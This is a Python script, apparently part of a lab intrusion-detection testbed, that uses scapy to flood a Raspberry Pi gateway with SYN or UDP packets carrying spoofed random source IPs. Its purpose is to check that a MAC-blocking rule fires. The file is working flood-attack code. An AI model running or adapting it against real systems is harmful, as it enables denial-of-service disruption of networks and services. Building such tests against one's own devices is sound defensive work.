"""Spoofed flood: SYN or UDP packets with a FAKE random source IP on every packet (IP spoofing).

The model cannot see this (no sender ever fills a window); the AddressWatcher rule on the Pi catches it:
one MAC address, many source IPs. The Pi then blocks the MAC address.

python spoofed_flood.py 172.29.1.135                    (SYN, 10 s, 500 packets/s, port 1884)
python spoofed_flood.py 172.29.1.135 --udp --port 5683
"""
import argparse
import random

from scapy.layers.inet import IP, TCP, UDP

from attack_base import Attack


class SpoofedFlood(Attack):
    name = "spoofed flood"

    def __init__(self, target, port, seconds, rate, udp):
        super().__init__(target, port, seconds, rate)
        self.udp = udp

    def make_packet(self):
        fake_source = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        ip = IP(src=fake_source, dst=self.target)
        if self.udp:
            return ip / UDP(sport=random.randint(1024, 65535), dport=self.port) / (b"x" * 32)
        return ip / TCP(sport=random.randint(1024, 65535), dport=self.port, flags="S")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="spoofed SYN / UDP flood")
    p.add_argument("target", help="IP of the Pi (gateway)")
    p.add_argument("--port", type=int, default=1884)
    p.add_argument("--seconds", type=int, default=10)
    p.add_argument("--rate", type=int, default=500, help="packets per second")
    p.add_argument("--udp", action="store_true", help="UDP instead of SYN")
    a = p.parse_args()
    SpoofedFlood(a.target, a.port, a.seconds, a.rate, a.udp).run()
